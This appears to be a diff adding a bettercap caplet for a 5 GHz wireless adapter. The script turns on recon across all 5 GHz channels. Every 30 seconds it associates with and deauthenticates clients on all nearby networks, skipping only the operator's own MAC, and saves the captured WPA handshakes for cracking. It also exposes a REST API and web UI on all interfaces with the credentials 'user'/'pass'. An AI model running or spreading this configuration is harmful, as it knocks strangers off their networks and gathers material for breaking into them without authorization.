@@ -1,0 +1,59 @@
+# 5Ghz Only Device (wlan2)
+# Used for limited the number of channels to hop
+# Change DE:AD:BE:EF:AA:BB to Personal Macs
+
+# GPS
+set gps.baudrate 4800
+set gps.device localhost:2947
+gps on
+
+# API
+set api.rest.address 0.0.0.0
+set api.rest.port 31001
+set api.rest.username user
+set api.rest.password pass
+set api.rest.websocket true
+api.rest on
+
+# HTTP
+set http.server.address 0.0.0.0
+set http.server.port 31000
+set http.server.path /usr/local/share/bettercap/ui
+http.server on
+
+# EVENTS
+events.ignore ble.device.new
+events.ignore ble.device.lost
+events.ignore ble.device.disconnected
+events.ignore ble.device.connected
+events.ignore ble.device.service.discovered
+events.ignore ble.device.characteristic.discovered
+events.ignore wifi.client.new
+events.ignore wifi.client.lost
+events.ignore wifi.client.probe
+events.ignore wifi.ap.new
+events.ignore wifi.ap.lost
+events.ignore mod.started
+
+# WIFI
+set wifi.assoc.open true
+set wifi.assoc.skip DE:AD:BE:EF:AA:BB
+set wifi.deauth.open true
+set wifi.deauth.skip DE:AD:BE:EF:AA:BB
+set wifi.handshakes.file /root/handshakes/
+set wifi.handshakes.aggregate false
+set wifi.recon.channel 36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165
+set wifi.region US
+set wifi.show.sort clients desc
+set wifi.ap.ttl 120
+set wifi.sta.ttl 300
+set wifi.rssi.min -200
+
+set ticker.period 30
+set ticker.commands wifi.assoc all; sleep 5; wifi.deauth all
+
+wifi.recon on
+
+sleep 5
+ticker on
+clear
